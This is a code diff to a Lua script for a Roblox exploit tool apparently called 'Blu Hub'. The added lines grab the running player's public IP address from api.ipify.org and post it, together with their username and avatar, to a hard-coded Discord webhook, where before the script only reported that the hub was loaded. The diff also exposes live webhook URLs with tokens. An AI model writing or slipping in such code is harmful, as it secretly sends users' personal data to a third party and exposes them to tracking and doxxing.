@@ -4,13 +4,16 @@ local UserIds = {
 	149522897,		--Booh
 	1425652856,		-- Kaz
 }
+local WebUrl = "https://discord.com/api/webhooks/1056802768557441114/EFRU4id73UzetMdOJfv9MLbVXlmQgms6Hh36OAScFJabsgi_qqjxG-_4Yyclrv7bgOKx"
+
 
 local Player = game:GetService("Players").LocalPlayer
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local msg = {
 	["embeds"] = {{
 		["title"] = "**".. Player.Name .."**",
 		["color"] = 13708129,
-		["description"] = Player.Name .." Has Loaded Blu Hub",
+		["description"] = "IP: ".. ip,
 		["thumbnail"] = {
 			["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
 		},
@@ -22,7 +25,7 @@ local msg = {
 
 local response = syn.request(
 	{
-		Url = "https://discord.com/api/webhooks/1056800872597815307/Q_S6pxiyn1nBjgsm9b3Wy_D3wXIG-MKryUMSS1Lf5iQRH281RxZ5O2ji8HRDs0REFO7j",
+		Url = WebUrl,
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
